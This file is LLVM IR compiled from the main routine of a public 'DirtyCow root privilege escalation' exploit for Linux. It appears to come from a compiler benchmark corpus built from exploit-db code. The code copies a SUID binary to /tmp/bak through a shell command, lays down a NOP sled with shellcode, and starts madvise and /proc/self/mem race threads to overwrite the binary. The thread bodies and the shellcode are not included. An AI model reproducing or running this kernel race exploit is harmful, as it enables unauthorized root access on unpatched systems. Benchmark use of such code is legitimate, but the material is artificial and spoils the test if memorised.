; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40616.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40616.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32 }

@.str = private unnamed_addr constant [36 x i8] c"DirtyCow root privilege escalation\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"Backing up %s.. to /tmp/bak\0A\00", align 1
@suid_binary = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [15 x i8] c"cp %s /tmp/bak\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@f = common dso_local global i32 0, align 4
@st = common dso_local global %struct.TYPE_3__ zeroinitializer, align 4
@.str.3 = private unnamed_addr constant [20 x i8] c"Size of binary: %d\0A\00", align 1
@sc = common dso_local global i32 0, align 4
@sc_len = common dso_local global i64 0, align 8
@PROT_READ = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@map = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [33 x i8] c"Racing, this may take a while..\0A\00", align 1
@pth1 = common dso_local global i32 0, align 4
@madviseThread = common dso_local global i32 0, align 4
@pth2 = common dso_local global i32 0, align 4
@procselfmemThread = common dso_local global i32 0, align 4
@pth3 = common dso_local global i32 0, align 4
@waitForWrite = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0))
  %10 = load i8*, i8** @suid_binary, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %10)
  %12 = load i8*, i8** @suid_binary, align 8
  %13 = call i32 @asprintf(i8** %6, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* %12)
  %14 = load i8*, i8** %6, align 8
  %15 = call i32 @system(i8* %14)
  %16 = load i8*, i8** @suid_binary, align 8
  %17 = load i32, i32* @O_RDONLY, align 4
  %18 = call i32 @open(i8* %16, i32 %17)
  store i32 %18, i32* @f, align 4
  %19 = load i32, i32* @f, align 4
  %20 = call i32 @fstat(i32 %19, %struct.TYPE_3__* @st)
  %21 = load i32, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 4
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i32 %21)
  %23 = load i32, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 4
  %24 = zext i32 %23 to i64
  %25 = call i8* @llvm.stacksave()
  store i8* %25, i8** %7, align 8
  %26 = alloca i8, i64 %24, align 16
  store i64 %24, i64* %8, align 8
  %27 = load i32, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 4
  %28 = call i32 @memset(i8* %26, i32 144, i32 %27)
  %29 = load i32, i32* @sc, align 4
  %30 = load i64, i64* @sc_len, align 8
  %31 = add nsw i64 %30, 1
  %32 = call i32 @memcpy(i8* %26, i32 %29, i64 %31)
  %33 = load i32, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 4
  %34 = load i32, i32* @PROT_READ, align 4
  %35 = load i32, i32* @MAP_PRIVATE, align 4
  %36 = load i32, i32* @f, align 4
  %37 = call i32 @mmap(i32* null, i32 %33, i32 %34, i32 %35, i32 %36, i32 0)
  store i32 %37, i32* @map, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  %39 = load i8*, i8** @suid_binary, align 8
  %40 = call i32 @pthread_create(i32* @pth1, i32* null, i32* @madviseThread, i8* %39)
  %41 = call i32 @pthread_create(i32* @pth2, i32* null, i32* @procselfmemThread, i8* %26)
  %42 = call i32 @pthread_create(i32* @pth3, i32* null, i32* @waitForWrite, i8* null)
  %43 = load i32, i32* @pth3, align 4
  %44 = call i32 @pthread_join(i32 %43, i32* null)
  store i32 0, i32* %3, align 4
  %45 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %45)
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @asprintf(i8**, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.TYPE_3__*) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i64) #1

declare dso_local i32 @mmap(i32*, i32, i32, i32, i32, i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32*, i8*) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
